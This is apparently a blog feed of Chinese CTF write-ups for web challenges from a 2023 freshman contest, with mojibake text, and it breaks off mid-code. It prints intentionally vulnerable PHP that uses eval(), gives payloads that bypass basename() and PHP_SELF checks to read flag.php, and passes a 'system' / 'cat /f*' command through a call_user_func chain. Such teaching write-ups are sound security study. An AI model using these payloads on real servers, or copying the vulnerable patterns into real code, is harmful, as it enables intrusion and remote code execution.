class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>é¦–å…ˆçœ‹ç¬¬ä¸€ä¸ªæ­£åˆ™åˆ¤æ–­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$_SERVER[â€˜PHP_SELFâ€™]çš„å€¼ä¼šèµ‹ç»™basename()å‡½æ•°</p><p>ä½†æ˜¯åœ¨é»˜è®¤ç¯å¢ƒä¸­basename()ä¼šåˆ é™¤æ–‡ä»¶åå¼€å¤´éASCIIå­—ç¬¦å’Œä¸­æ–‡</p><p>å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥ç»•è¿‡è¿™å±‚æ­£åˆ™åˆ¤æ–­</p><p>ç»§ç»­çœ‹ç¬¬äºŒä¸ªæ­£åˆ™åˆ¤æ–­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show_source/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>URLç¼–ç ç»•è¿‡</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28090/index.php/utils.php/å§æ§½?%73how_source</span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬ä¼ å…¥index.php&#x2F;utils.php&#x2F;æ—¶basename()å‡½æ•°ä¼šå°†å…¶è§£ææˆutils.phpï¼Œè€Œè¿™é‡Œçš„å§æ§½æ˜¯ç»•è¿‡ç¬¬ä¸€ä¸ªæ­£åˆ™ï¼Œbasename()ä¼šå°†å…¶åˆ é™¤ï¼Œè€Œ%73æ˜¯ä¸ºäº†ç»•è¿‡ç¬¬äºŒä¸ªæ­£åˆ™ã€‚</p><p><img src="/../images/image-20231219190928665.png" alt="image-20231219190928665"></p><h1 id="ç¢å…‰æ¯-2023-å¤©å‘½ä¹‹å­"><a href="#ç¢å…‰æ¯-2023-å¤©å‘½ä¹‹å­" class="headerlink" title="[ç¢å…‰æ¯ 2023] å¤©å‘½ä¹‹å­"></a>[ç¢å…‰æ¯ 2023] å¤©å‘½ä¹‹å­</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sou_rc.e&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ars</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="variable">$sec</span>=<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">100000</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$sec</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$ars</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§£é¢˜æ€è·¯è·Ÿä¸Šé¢˜ä¸€æ ·</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/flag.php/å§æ§½?sou[rc.e</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SERVERå‚æ•°å’Œbasenameå‡½æ•°ç»•è¿‡&quot;&gt;&lt;a href=&quot;#SERVERå‚æ•°å’Œbasenameå‡½æ•°ç»•è¿‡&quot; class=&quot;headerlink&quot; title=&quot;$_SERVERå‚æ•°å’Œbasenameå‡½æ•°ç»•è¿‡&quot;&gt;&lt;/a&gt;$_SERVERå‚æ•°å’Œbasenameå‡½æ•°</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ç¢å…‰æ¯æ–°ç”Ÿèµ›wp(web)</title>
    <link href="http://example.com/2023/12/15/%E7%90%A2%E5%85%89%E6%9D%AF%E6%96%B0%E7%94%9F%E8%B5%9Bwp-web/"/>
    <id>http://example.com/2023/12/15/%E7%90%A2%E5%85%89%E6%9D%AF%E6%96%B0%E7%94%9F%E8%B5%9Bwp-web/</id>
    <published>2023-12-15T11:42:17.000Z</published>
    <updated>2023-12-15T11:43:25.759Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å¤©å‘½ä¹‹å­"><a href="#å¤©å‘½ä¹‹å­" class="headerlink" title="å¤©å‘½ä¹‹å­"></a>å¤©å‘½ä¹‹å­</h1><p>æ‰“å¼€ç¯å¢ƒ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ ä¸ ä¼š å§ ï¼Ÿ &quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;sou_rc.e&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br>    <br>    <br>    <br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-variable">$ars</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$sec</span>=<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100000</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$sec</span>)==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$ars</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>basename+æ­£åˆ™ç»•è¿‡</p><p>è„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">255</span>;<span class="hljs-variable">$i</span>++)&#123;<br><span class="hljs-variable">$s</span>=<span class="hljs-string">&#x27;/index.php/config.php/&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$s</span>))&#123;<br><span class="hljs-variable">$t</span>=<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-string">&#x27;/index.php/config.php/&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(i));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;$&#123;i&#125;:$&#123;t&#125;\n&quot;</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">/<span class="hljs-keyword">index</span>.php/flag.php/<span class="hljs-title function_">%ff</span>?sou[rc.e<br></code></pre></td></tr></table></figure><p><img src="/../images/image-20231215190234449.png" alt="image-20231215190234449"></p><h1 id="phpæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€"><a href="#phpæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€" class="headerlink" title="phpæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€"></a>phpæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€</h1><p>æ‰“å¼€ç¯å¢ƒ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$action</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>];<br><span class="hljs-variable">$parameters</span> = <span class="hljs-variable">$_GET</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$parameters</span>[<span class="hljs-string">&#x27;action&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$parameters</span>[<span class="hljs-string">&#x27;action&#x27;</span>]);<br>&#125;<br><br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$action</span>, <span class="hljs-variable">$parameters</span>)(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>])(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>currentä¼šè¾“å‡ºæ•°ç»„å½“å‰å…ƒç´ å€¼</p><p>payload:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">action</span>=current&amp;a=current<br>POST:<br>a[]=system&amp;<span class="hljs-attribute">b</span>=cat /f*<br></code></pre></td></tr></table></figure><p><img src="/../images/image-20231215190559981.png" alt="image-20231215190559981"></p><h1 id="serialize-escape"><a href="#serialize-escape" class="headerlink" title="serialize_escape"></a>serialize_escape</h1><p>æç¤º<a href="http://www.zipæœ‰å¥½ä¸œè¥¿/">www.zipæœ‰å¥½ä¸œè¥¿</a></p><p>ä¸‹è½½</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">sing</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$x</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$xx</span></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;x = <span class="hljs-variable">$xx</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;x);<br>        <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;win!&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-comment">// Thinking how to use sing?</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">jump</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$root</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$pwd</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$root</span>, <span class="hljs-variable">$pwd</span></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;root = <span class="hljs-variable">$root</span>;<br><span class="hljs-variable language_">$this</span>-&gt;pwd = <span class="hljs-variable">$pwd</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;root);<br><span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;pwd);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hehe!&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sw</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;ikun&#x27;</span>, <span class="hljs-string">&#x27;kk&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;A&#x27;</span>]))&#123; <br>    <span 